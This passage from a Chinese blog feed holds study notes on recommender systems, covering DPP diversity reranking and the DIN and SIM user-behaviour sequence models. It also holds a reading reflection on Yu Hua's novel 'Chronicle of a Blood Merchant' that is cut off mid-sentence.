$\operatorname{vol}(\mathcal{P}(\mathcal{S}))$ 可以衡量 $\mathcal{S}$ 中物品的多样性。</p><p>设 $k \leq d $，行列式与体积满⾜：</p><p>$$<br>\operatorname{det}\left({V}_{\mathcal{S}}^{T} {V}_{\mathcal{S}}\right)&#x3D;\operatorname{vol}(\mathcal{P}(\mathcal{S}))^{2}<br>$$</p><h2 id="5-2-行列式点过程"><a href="#5-2-行列式点过程" class="headerlink" title="5.2 行列式点过程"></a>5.2 行列式点过程</h2><p>DPP 是一种传统的统计机器学习⽅法：</p><p>$$<br>\underset{\mathcal{S} :\mid \mathcal{S | &#x3D; k}}{\operatorname{argmax}} \log \operatorname{det}\left({V}_{\mathcal{S}}^{T} {V}_{\mathcal{S}}\right)<br>$$</p><p>Hulu 的论文（Fast greedy map inference for determinantal point process to improve recommendation diversity）将 DPP 应用在推荐系统：</p><p>$$<br>\underset{S:|S |&#x3D;k}{\operatorname{argmax}} \theta \cdot\left(\sum_{j \in S} \operatorname{reward}_{j}\right)+(1-\theta) \cdot \log \operatorname{det}\left({V}_{S}^{T} {V}_{S}\right)<br>$$</p><p>把上面 ${V}_{S}^{T} {V}_{S}$ 记作 $A_S$，它的大小是 $k\times k$，则上述公式可以替换成下面这种形式：</p><p>$$<br>\underset{S:|S |&#x3D;k}{\operatorname{argmax}} \theta \cdot\left(\sum_{j \in S} \operatorname{reward}_{j}\right)+(1-\theta) \cdot \log \operatorname{det}\left(A_S\right)<br>$$</p><p>DPP 是个组合优化问题，从集合 ${1, \cdots, n}$ 中选出一个大小为 $k$ 的⼦集 $\mathcal{S}$。用 $\mathcal{S}$ 表示已选中的物品，用 $\mathcal{R}$ 表示未选中的物品，贪⼼算法求解：</p><p>$$<br>\underset{i \in \mathcal{R}}{\operatorname{argmax}} \theta \cdot \operatorname{reward}_{i}+(1-\theta) \cdot \log \operatorname{det}\left({A}_{\mathcal{S} \cup{i}}\right)<br>$$</p><p>${A}_{\mathcal{S} \cup{i}}$ 表示在矩阵 $A_S$ 基础上增加 $i$ 这一行和一列，目的是让增加后的矩阵的行列式尽量大，这样可以保证选出的物品与物品 $i$ 尽量不相似，如果有物品和 $i$ 相似，那么行列式就会接近 0。</p><h2 id="5-3-求解-DPP"><a href="#5-3-求解-DPP" class="headerlink" title="5.3 求解 DPP"></a>5.3 求解 DPP</h2><h3 id="5-3-1-暴力算法"><a href="#5-3-1-暴力算法" class="headerlink" title="5.3.1 暴力算法"></a>5.3.1 暴力算法</h3><p>对于单个 $i$，计算 ${A}_{\mathcal{S} \cup {i}}$ 的行列式需要 $O\left(|\mathcal{S}|^{3}\right)$时间。对于所有的 $i \in \mathcal{R}$，计算行列式需要时间 $O\left(|\mathcal{S}|^{3} \cdot|\mathcal{R}|\right)$。</p><p>需要求解上式 $k$ 次才能选出 $k$ 个物品。如果暴力计算行列式，那么总时间复杂度为：</p><p>$$<br>O\left(n^2d\right) + O\left(|\delta|^{3} \cdot|\mathcal{R}| \cdot k\right)&#x3D;O\left(n^2d\right)+O\left(n k^{4}\right)<br>$$</p><ul><li>$O(n^2d)$ 是计算矩阵 $A$ 的时间</li><li>$O(nk^4)$ 是计算行列式的时间</li></ul><p>$n$ 的量级是几百，$k$ 和 $d$ 的量级都是几十，这个时间复杂度看起来可行，但是由于系统留给多样性算法的时间也就是 10ms 左右，所以太慢了。</p><h3 id="5-3-2-Hulu的快速算法"><a href="#5-3-2-Hulu的快速算法" class="headerlink" title="5.3.2 Hulu的快速算法"></a>5.3.2 Hulu的快速算法</h3><p>Hulu 的论文设计了一种数值算法，仅需 $O\left(n^{2} d+n k^{2}\right)$ 的时间从 $n$ 个物品中选出 $k$ 个物品。</p><ul><li>给定向量 ${v}_{1}, \cdots, {v}_{n} \in \mathbb{R}^{d}$，需要 $O\left(n^{2} d\right)$ 时间计算 $A$</li><li>用 $O(nk^2)$ 的时间计算所有的行列式（利用 Cholesky 分解）</li></ul><p>Cholesky 分解 ${A}_{\delta}&#x3D;{L} {L}^{T}$，其中 $L$ 是下三角矩阵（对角线以上的元素全零）。Cholesky 分解可供计算 $A_S$ 的行列式：</p><ul><li>下三角矩阵 $L$ 的行列式 $\operatorname{det}({L})$ 等于 $L$ 对角线元素乘积</li><li>$A_S$ 的行列式为 $\operatorname{det}\left({A}_{S}\right)&#x3D;\operatorname{det}({L})^{2}&#x3D;\prod_{i} l_{i i}^{2}$</li></ul><p>已知 ${A}_{\delta}&#x3D;{L} {L}^{T}$，则可以快速求出所有 ${A}_{\mathcal{S} \cup {i}}$ 的 Cholesky 分解，因此可以快速算出所有 ${A}_{\mathcal{S} \cup {i}}$ 的行列式。</p><p>$$<br>\underset{i \in \mathcal{R}}{\operatorname{argmax}} \theta \cdot \operatorname{reward}_{i}+(1-\theta) \log \operatorname{det}\left(\boldsymbol{A}_{S \cup{i}}\right)<br>$$</p><p>初始时 $\mathcal{S}$ 中只有一个物品，$A_S$ 是 1×1 的矩阵，之后每一轮循环，基于上一轮算出的 ${A}_{\delta}&#x3D;{L} {L}^{T}$，快速求出增加一行一列后的 ${A}_{\mathcal{S} \cup \{i\}}$ 的 Cholesky 分解 $(\forall i \in \mathcal{R})$，从⽽求出 $\log \operatorname{det}\left({A}_{S\cup\{i\}}\right)$ 。</p><h2 id="5-4-DPP-的扩展"><a href="#5-4-DPP-的扩展" class="headerlink" title="5.4 DPP 的扩展"></a>5.4 DPP 的扩展</h2><h3 id="5-4-1-滑动窗口"><a href="#5-4-1-滑动窗口" class="headerlink" title="5.4.1 滑动窗口"></a>5.4.1 滑动窗口</h3><p>随着集合 $\mathcal{S}$ 增大，其中相似物品越来越多，物品向量会趋近线性相关。则行列式 $\operatorname{det}\left({A}_{S}\right)$ 会坍缩到零，对数趋于负无穷，此时 DPP 就失效了。</p><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_sBe522ZWB7.png"></p><p>用滑动窗口 $\mathcal{W}$ 代替集合 $\mathcal{S}$，只考虑最近选中的一批物品，不考虑很久之前的物品。</p><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_AvDqrZhDgD.png"></p><h3 id="5-4-2-规则约束"><a href="#5-4-2-规则约束" class="headerlink" title="5.4.2 规则约束"></a>5.4.2 规则约束</h3><p>贪⼼算法每轮从 $\mathcal{R}$ 中选出一个物品：</p><p>$$<br>\underset{i \in \mathcal{R}}{\operatorname{argmax}} \theta \cdot \operatorname{reward}_{i}+(1-\theta) \cdot \log \operatorname{det}\left({A}_{\mathcal{W} \cup\{i\}}\right)<br>$$</p><p>实际的推荐系统中有很多规则约束，例如最多连续出 5 篇视频笔记（如果已经连续出了 5 篇视频笔记，下一篇必须是图文笔记）。由于存在这些规则，算法不能从集合 $\mathcal{R}$ 中选择物品，只能从符合规则约束的物品中进行选择。</p><p>首先用规则排除掉 $\mathcal{R}$ 中的部分物品，得到⼦集 $\mathcal{R}’$，然后求解下面的公式：</p><p>$$<br>\underset{i \in \mathcal{R}’}{\operatorname{argmax}} \theta \cdot \operatorname{reward}_{i}+(1-\theta) \cdot \log \operatorname{det}\left({A}_{\mathcal{W} \cup\{i\}}\right)<br>$$</p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记7：用户行为序列建模</title>
      <link href="/2024/10/19/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%BA%8F%E5%88%97%E5%BB%BA%E6%A8%A1/"/>
      <url>/2024/10/19/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%BA%8F%E5%88%97%E5%BB%BA%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="1-LastN-特征"><a href="#1-LastN-特征" class="headerlink" title="1 LastN 特征"></a>1 LastN 特征</h1><p>LastN 表示用户最近的 $n$ 次交互（点击、点赞等）的物品 ID，可以反应出来用户最近对什么物品感兴趣。召回的双塔模型、粗排的三塔模型和精排模型都可以使用 LastN 特征，LastN 特征很有效。</p><p>如下图所示，对 LastN 物品 ID 做 embedding，得到 $n$ 个向量。把 $n$ 个向量取平均得到一个向量，这个向量作为用户的⼀种特征，表示用户曾经对什么样的物品感兴趣。</p><p><img src="/2024/10/19/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%BA%8F%E5%88%97%E5%BB%BA%E6%A8%A1/image_BR9stpBY8q.png"></p><p>小红书的召回、粗排和精排都用到了 LastN 特征。可以对用户的最近点击过的、点赞过的和收藏过的物品 ID 做嵌入，然后取平均后得到相应的向量，把这些向量拼起来作为一种特征，用于召回等步骤。</p><p><img src="/2024/10/19/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%BA%8F%E5%88%97%E5%BB%BA%E6%A8%A1/image_d64PFRQCkI.png"></p><hr><h1 id="2-DIN-模型（注意力机制）"><a href="#2-DIN-模型（注意力机制）" class="headerlink" title="2 DIN 模型（注意力机制）"></a>2 DIN 模型（注意力机制）</h1><h2 id="2-1-工作原理"><a href="#2-1-工作原理" class="headerlink" title="2.1 工作原理"></a>2.1 工作原理</h2><p>上面介绍的 LastN 特征是对嵌入后的向量取平均，但是取平均不是最好的方法。最近几年有很多论文提出了对 LastN 特征序列建模更好的方法。其中 DIN 是阿里在 2018 年提出的。</p><p>想法很简单，就是用加权平均代替平均，即注意力机制（attention）。其中权重是候选物品与用户 LastN 物品的相似度，哪个 LastN 物品和候选物品越相似，权重越大。</p><p>计算候选物品 $q$ 和第一个 LastN 物品的相似度 $\alpha_1$，和第二个 LastN 物品的相似度 $\alpha_2$，……，以此类推。把每个 $\alpha$ 与对应的向量相乘，然后进行加权和得到下面紫色的向量。</p><p><img src="/2024/10/19/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%BA%8F%E5%88%97%E5%BB%BA%E6%A8%A1/image_e0QteoAtk2.png"></p><p>将上述过程总结如下：对于某候选物品，计算它与用户 LastN 物品的相似度。以相似度为权重，求用户 LastN 物品向量的加权和，结果是⼀个向量。把得到的向量作为⼀种用户特征，输⼊排序模型，预估（用户，候选物品）的点击率、点赞率等指标。</p><p>如下图所示，DIN 模型的本质是注意力机制（attention），其中把红色向量作为 $key$ 和 $value$，蓝色向量作为 $query$。</p><p><img src="/2024/10/19/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%BA%8F%E5%88%97%E5%BB%BA%E6%A8%A1/image_tyLST2AKnu.png"></p><h2 id="2-2-DIN-模型有效的原因"><a href="#2-2-DIN-模型有效的原因" class="headerlink" title="2.2 DIN 模型有效的原因"></a>2.2 DIN 模型有效的原因</h2><blockquote><p>示例 1</p></blockquote><p><img src="/2024/10/19/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%BA%8F%E5%88%97%E5%BB%BA%E6%A8%A1/image_vYf8_ai-om.png"></p><blockquote><p>示例 2&#x20;</p></blockquote><p><img src="/2024/10/19/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%BA%8F%E5%88%97%E5%BB%BA%E6%A8%A1/image_p-QDZL-aLG.png"></p><h2 id="2-3-简单平均-vs-注意力机制"><a href="#2-3-简单平均-vs-注意力机制" class="headerlink" title="2.3 简单平均 vs 注意力机制"></a>2.3 简单平均 vs 注意力机制</h2><p>简单平均和注意力机制都适用于精排模型，同时<strong>简单平均也适用于双塔模型和三塔模型</strong>，因为简单平均只需要用到 LastN，属于用户自身的特征，只需要把 LastN 向量的平均作为用户塔的输入即可。</p><p><strong>但是注意力机制不适用于双塔模型和三塔模型</strong>。因为注意力机制需要用到 LastN 和候选物品，但是用户塔在处理的时候是看不到候选物品的，所以不能把注意力机制用在用户塔。</p><hr><h1 id="3-SIM-模型（长序列建模）"><a href="#3-SIM-模型（长序列建模）" class="headerlink" title="3 SIM 模型（长序列建模）"></a>3 SIM 模型（长序列建模）</h1><h2 id="3-1-DIN-模型回顾"><a href="#3-1-DIN-模型回顾" class="headerlink" title="3.1 DIN 模型回顾"></a>3.1 DIN 模型回顾</h2><p>DIN 模型的缺点：</p><ol><li>注意力层的计算量 ∝ $n$（用户行为序列的长度），$n$ 越大，计算量就越大。</li><li>只能记录最近几百个物品，否则计算量太大。</li><li>关注短期兴趣，遗忘长期兴趣。</li></ol><p>如何改进DIN？目标是保留用户长期行为序列（$n$ 很大），而且计算量不会过大。</p><ul><li>DIN 对 LastN 向量做加权平均，权重是相似度</li><li>如果某 LastN 物品与候选物品差异很大，则权重接近零</li><li>快速排除掉与候选物品无关的 LastN 物品，降低注意力层的计算量</li></ul><p>所以 SIM 模型需要保留用户长期行为记录，$n$ 的大小可以是几千，对于每个候选物品，在用户 LastN 记录中做快速查找，找到 $k$ 个相似物品。通过查找把 LastN 变成 TopK，然后输⼊到注意力层。SIM 模型减小计算量（从 $n$ 降到 $k$），再用注意力，$k$ 比较小，效果也很好。</p><h2 id="3-2-Step1：查找"><a href="#3-2-Step1：查找" class="headerlink" title="3.2 Step1：查找"></a>3.2 Step1：查找</h2><ol><li><p><strong>方法一：Hard Search（根据规则做筛选）</strong></p><p>原理：根据候选物品的类目，保留 LastN 物品中类目相同的。</p><p>优点：简单、快速并且无需训练。</p></li><li><p><strong>方法二：Soft Search</strong></p><p>原理：把物品做 embedding，变成向量。把候选物品向量作为query，做 $k$ 近邻查找，保留 LastN 物品中最接近的 $k$ 个。</p><p>优点：效果更好，编程实现更复杂。</p></li></ol><p>实验表明 Soft Search 比 Hard Search 效果更好，指标 AUC 更高。</p><h2 id="3-3-Step2：注意力机制"><a href="#3-3-Step2：注意力机制" class="headerlink" title="3.3 Step2：注意力机制"></a>3.3 Step2：注意力机制</h2><p>注意力部分和 SIM 模型没有什么大的区别，主要的区别在于 $x_1,x_2, \dots,x_k$ 是用户 TopK 交互记录，而不是 LastN 记录。注意力层输出的紫色向量和其他特征一起作为用户行为特征送入精排模型中，用于预测点击率等指标。</p><p><img src="/2024/10/19/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%BA%8F%E5%88%97%E5%BB%BA%E6%A8%A1/image_M-_EsaQ8Z9.png"></p><p>在这里有个技巧：使用时间信息。可以记录用户与某个 LastN 物品的交互时刻，距今为 $\delta$，对 $\delta$ 做离散化，划分成很多区间，再做 embedding，变成向量 $d$。</p><p>现在有两个向量，向量 $x$ 是物品 embedding，向量 $d$ 是时间的 embedding，把两个向量做 concatenation 拼成一个向量，表征⼀个 LastN 物品。</p><p><img src="/2024/10/19/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07%EF%BC%9A%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%BA%8F%E5%88%97%E5%BB%BA%E6%A8%A1/image_KnLgSMd_Ve.png"></p><p>为什么 DIN 模型不使用时间信息，SIM 模型使用时间信息？</p><ul><li>DIN 的序列短，记录用户近期⾏为。</li><li>SIM 的序列长，记录用户长期⾏为。</li></ul><p>时间越久远，重要性越低，所以模型预测点击率的时候应该把时间也考虑到。</p><p>SIM 模型使用长序列（长期兴趣）优于短序列（近期兴趣），效果也更好。注意力机制显著优于简单平均。其中使用 Soft search 还是 hard search？取决于工程基建。</p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书记录1：许三观卖血记</title>
      <link href="/2024/10/18/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%951%EF%BC%9A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0/"/>
      <url>/2024/10/18/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%951%EF%BC%9A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/18/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%951%EF%BC%9A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0/image.png" alt="alt text"></p><blockquote><p>《许三观卖血记》是中国当代作家余华创作的长篇小说，首次发表于《收获》1995年第6期。</p></blockquote><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>最近刚读完了余华的《许三观卖血记》，在之前读过了余华的《活着》，当时读《活着》的时候就感触很深，福贵很惨，他的家人不断离他而去：父母、伴侣、孩子、孙子，最后只有一头老牛和他相依为命。所以在读《许三观卖血记》的时候，一看到这个名就知道肯定和《活着》的内容差不多，讲一个人命运很苦的，而且最后的下场很惨。但是《许三观卖血记》是余华笔下为数不多的幸福大结局的书籍，接下来就写下读完这本书的一些感悟。</p><hr><h1 id="2-经典句子"><a href="#2-经典句子" class="headerlink" title="2 经典句子"></a>2 经典句子</h1><ol><li>事情都是被逼出来的，人只有被逼上绝路了，才会有办法，没上绝路以前，不是没想到办法，就是想到了也不知道该不该去做。</li><li>就算是你不是我的儿子，就算再骂你，你饿了还是要给你买面吃。</li><li>我今天算是知道什么叫血汗钱了，我在工厂里挣的是汗钱，今天挣的是血钱。</li><li>这苦日子什么时候能完？小崽子苦得都忘记什么是甜，吃了甜的都想不起来这就是糖。 &#x20;</li><li>他的泪水在他的脸上纵横交错地流，就像雨水打在窗玻璃上，就像裂缝爬上快要破碎到碗，就像蓬勃生长出去的树枝，就像渠水流进了田地，就像街道布满了城镇，泪水在他脸上织成了一张网。 &#x20;</li><li>世上还有这种人，帮着别人来搬自己家里的东西，看上去还比别人更卖力。 &#x20;</li><li>这一天许三观走在街上时，脸上挂满了笑容，笑容使他脸上的皱纹像河水一样波动起来，阳光照在他脸上，把皱纹里面都照亮了。</li><li>许三观解开棉袄的纽扣，让冬天温暖的阳光照在胸前，于是他被岁月晒黑的胸口，又被寒风吹得通红。</li><li>来两盘猪肝，二两黄酒，黄酒温一温</li><li>风流一时，吃苦一世</li></ol><hr><h1 id="3-卖血过程"><a href="#3-卖血过程" class="headerlink" title="3 卖血过程"></a>3 卖血过程</h1><p>第一次卖血，他懵懂不知世事，用卖血的钱取了喜欢的漂亮媳妇。自己吃了一盘炒猪肝。</p><p>第二次卖血，是辛苦养了九年的大儿子，却是替别人养，被戴绿帽，被别人嘲笑。结果大儿子又打伤了人，被抄了家。为了还债，他又卖了血。 &#x20;</p><p>第三次卖血，因为他被戴绿帽被所有人嘲笑，许三观内心挣扎痛苦，感到不公。看望以前的相好时，邪念一出，干了坏事。心里过意不去，又去卖血，买了很多东西去补偿。</p><p>第四次卖血，遇到灾年，一家人喝了57天玉米粥之后，三个儿子都忘记了甜味，他又去卖血，带家人去面馆大吃一顿，让一家人过得好点。</p><p>第五次卖血，他看到下乡插队的一乐瘦骨嶙峋，他卖血给一乐钱。</p><p>第六次卖血，为了二乐在乡下早日抽调回城里，他又卖血请二乐队长吃饭喝酒抽烟。</p><p>第七次到十一次卖血，非亲生的大儿子一乐得了肝炎，为了攒钱救一乐，他一路卖血6次到上海。</p><p>他最后一次卖血，是因为他想吃一盘炒猪肝，然而他已经老了，头发白了，牙齿掉了，血头嫌弃他，儿子们也嫌弃他。只有妻子许玉兰带他去吃了心心念念的炒猪肝。</p><p>许三观每一次卖血，好像都有不能拒绝的理由。他每一次卖血都是为了生活，不得已而为之。哪怕有一点办法，谁想去卖血呢？为了他人卖了11次血，想为自己卖一次的时候却已垂垂老矣，再也卖不了血了。</p><hr><h1 id="4-关于婚姻"><a href="#4-关于婚姻" class="headerlink" title="4 关于婚姻"></a>4 关于婚姻</h1><blockquote><p>婚姻：一半靠爱情，一半靠义气</p></blockquote><p>许三观从小没爹没妈，一个人在城里当丝厂送茧工。于是他用第一次卖血赚的钱，娶了漂亮的油条西施许玉兰，给自己安了一个家。但是你说他喜欢徐玉兰吗？也不见得，可能就只是在第一次卖血之后，心血来潮想找女人。</p><p><font color=blue><strong>婚后的许三观，家庭生活和睦，夫妻俩也恩爱有加，接连生了三个男娃。</strong></font>可没想到随着孩子们一天天长大，街坊邻居流言四起，说他最喜爱的大儿子一乐长得不像他，倒像妻子之前的相好何小勇。许三观忍不住找妻子对质，得知妻子婚前给他戴绿帽子后，便在一次探病时，出轨了自己曾经喜欢的女人林芬芳。</p><p>换作现在，夫妻双方彼此不忠，家里早就鸡飞狗跳、不得安宁了。<strong>可许三观一家没有。</strong>他在得知自己的大儿子不是亲生的后，没有弃之不顾，依旧给他吃好穿好，还供他上学。而许玉兰也明白丈夫的出格只是出于报复心理，惩罚过他后这事也就翻篇了。</p><p><strong>两个人的日子，还是接着磕磕绊绊地往前走。</strong></p><p><img src="/2024/10/18/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%951%EF%BC%9A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0/image_ObDpJ8Fcqv.png"></p><p>有一年，突如其来的恶劣天气导致庄稼被毁，闹起了饥荒。看到街上的灾民越来越多，一向没有忧患意识的许三观，开始慌了。这时，许玉兰才告诉他，这些年她每天都会在做饭时省下一把米，买菜时省下一分钱。</p><p><strong>幸而靠着妻子的未雨绸缪，家里才勉强熬过了这段艰难的时光。</strong></p><p>到了“文革”期间，许玉兰被人拉出去批斗，不仅剃了阴阳头，还要每天到街上最热闹的地方去挂牌站着，身心都遭受了莫大的伤害。<strong>许三观没有因此抛下妻子，相反他冒着出门被人扔小石子、吐唾沫的风险，每天风雨无阻地给妻子送米饭，甚至还偷偷藏了红烧肉。</strong>等到许玉兰傍晚回来，就给她吃捂到被窝的饭菜，准备好热水泡脚，还在孩子们面前维护她，这才稳住了一家人的心。</p><p><strong>就这样，许三观夫妻俩相互扶持，渡过了一道又一道难关，最终迎来了彼此搀扶、相守相依的圆满结局。</strong></p><p>杨澜曾说：“婚姻需要爱情之外的另一种纽带，最坚韧的一种不是孩子，也不是利益和金钱，而是肝胆相照的义气。”其实，最好的婚姻，既不是初见时的怦然心动，也不是相处时的从未红脸。而是犯错时彼此谅解的包容，低谷时相互扶持的义气。</p><p><strong>每对夫妻唯有通过生活的层层考验，才能彻底悟透婚姻的真谛。</strong></p><p><img src="/2024/10/18/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%951%EF%BC%9A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0/image_s8v_gjxK55.png"></p><hr><h1 id="5-关于家庭"><a href="#5-关于家庭" class="headerlink" title="5 关于家庭"></a>5 关于家庭</h1><blockquote><p>家庭：一半靠血缘，一半靠珍惜</p></blockquote><p>许三观是在大儿子一乐九岁那年，才知道自己给别人养了儿子。<strong>从此以后，他的心里便埋下了一根刺。</strong>虽然继续养着一乐，却再也无法把他像自己的亲儿子般看待。</p><p>闹灾荒的那年，就在全家人快要熬不下去的时候，许三观去卖了次血。他带着家人上饭店改善伙食，可唯独抛下了一乐。<strong>第二天一早，伤心的一乐便离家出走去找亲爹。</strong>许三观待在家里一副满不在乎的样子，妻子却着急地找了一天。</p><p>直到傍晚，他才忍不住出门，却发现一乐就蹲在家门外，哭着跟他诉说这一天的遭遇。原来，一乐发现，许三观比亲爹对他好太多，于是便丢掉之前的想法，主动回来了。</p><p><strong>许三观的心就在那一刻释然了。他明白了不是只有血缘关系的人才算得上是亲人，那些随着时间积累起来的感情才是无可替代的纽带。</strong></p><p>于是，他背着一乐去孩子心心念念的饭馆吃面条，从此拔掉了心上的刺，而一乐也在心里认定了许三观这个父亲。</p><p><strong>他们对彼此的爱，开始变成了双向奔赴。</strong></p><p>后来，成年工作后的一乐，在下乡的艰苦日子里患上了肝炎，必须立马到上海的大医院救治才能活命。许三观把家里所有的积蓄都拿出来，又挨家挨户地借钱，治疗费还是远远不够。<strong>万不得已，他又走上了卖血赚钱的道路。</strong></p><p>医院规定每隔三个月才能卖一次血，可为了凑够一乐的费用，许三观偏向虎山行。他一路北上，落脚于一座又一座城市来卖血赚钱，毫不犹豫地以命换命。</p><p>周国平曾说：<strong>“爱，就是在这一世寻找那个仿佛在前世失散的亲人，就是在人世间寻找那个最亲的亲人。”</strong></p><ul><li>真正的亲人，是以爱为圆心，用信任作半径，画出给彼此遮风挡雨的一隅之地。</li><li>真正的家人，不是靠血缘关系来维系的，而是以爱和珍视为纽带，联结着彼此。</li></ul><p><img src="/2024/10/18/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%951%EF%BC%9A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0/image_biQfTQRoeZ.png"></p><hr><h1 id="6-关于人生"><a href="#6-关于人生" class="headerlink" title="6 关于人生"></a>6 关于人生</h1><blockquote><p>人生：一半靠命运，一半靠经营</p></blockquote><p>正如作家东野圭吾所说：<strong>“最终的所谓命运，还是自己一步步走出来的。”</strong></p><p>回顾许三观这一生，虽命运几经波折，却靠着认真经营，收获了一个圆满的结局。“搭伙过日子”的婚姻，是那个年代的标配。<strong>可对爱人珍惜、对家庭负责的许三观，却把一段“凑合”的婚姻，经营成了能够彼此依靠的坚强后盾。</strong></p><p>不管和妻子遇到怎样的困难与挫折，他都只有解决的念头，没有抛弃的想法。坚守“有福同享，有难同当”的婚姻经营之道，最后得一心相依，傍一人终老。而在一乐性命攸关的那一年，许三观挨家挨户地跟人借钱，<strong>凭着自己的人际经营，为儿子迎来一线生机。</strong></p><p><img src="/2024/10/18/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%951%EF%BC%9A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0/image_lGJArXcctC.png"></p><p>以前，年幼的一乐打伤了人，面对高额的医药赔偿费，许三观守信偿还，于是这次人家二话不说就借钱给他。曾经，他放下对何小勇的怨恨，在对方生死攸关之际不计前嫌，劝一乐去救人，于是其遗孀和女儿们都拿出了不少积蓄来帮他。</p><p><strong>许是老天垂怜，后来许三观在北上卖血的路上，又碰到了许多好心人。</strong></p><ul><li>有人看他喝着冰冷的江水，便送来了盐和热茶；</li><li>有人发现他晕倒在地，便给他盖了被子，买了面条；</li><li>有人知道他北上的目的后，便让他免费渡船，省下费用。</li></ul><p>正如《你好生活》里写的：“山有顶峰，湖有彼岸，在人生漫漫长途中，万物皆有回转，当我们觉得余味苦涩，请你相信，一切终有回甘。”</p><p>人生就是如此，你不知道在哪个转角会碰上厄运，也料不到在何时又能绝处逢生。<strong>好在，我们收下了上天赏赐的一半幸运，加之自己的一半经营，最终走出了人生的至暗时刻。</strong></p><hr><h1 id="7-画龙点睛"><a href="#7-画龙点睛" class="headerlink" title="7 画龙点睛"></a>7 画龙点睛</h1><p>普通工人阶级出身的许三观因一次好奇，发现了“卖血赚钱”这一行当。于是将“卖血”当成了一种惯性，每一次遇到困难时，许三观都靠“卖血”来解决。</p><p><strong>十二次的“卖血”经历，卖的不光是“血”，而是对“生命”的出卖。</strong>许三观以为只要还能“卖血”，就证明自己对家人、对社会还是有价值的。他甚至以为“卖血赚钱”就是他存在的价值。</p><p>然而，“卖血”终究是为现实服务的，当他因为身体和年纪的原因，被年轻的血头拒绝时，许三观崩溃了。<strong>当习以为常的事情不再习以为常，一时转变不过来的许三观陷入了迷茫。</strong></p><p>许三观的迷茫来自于他已经习惯了通过“卖血”，来解决生活中的难题，所以不知道除了“卖血”，他还能做些什么来体现自己的价值。好在，许三观是个乐观的人。</p><p><strong>短暂的迷茫过后，他终于和自己和解，并回到了常规的现实之中。</strong></p><p>经历过重重磨难后，已是花甲之年的许三观，终于卸下生活的重担，安享晚年。<strong>他的三个孩子各自成家立业，生活蒸蒸日上，而自己也与发妻历经风雨，依旧守候在彼此的身旁。</strong></p><p>这让我不禁想起杨绛先生的话：“生活一半柴米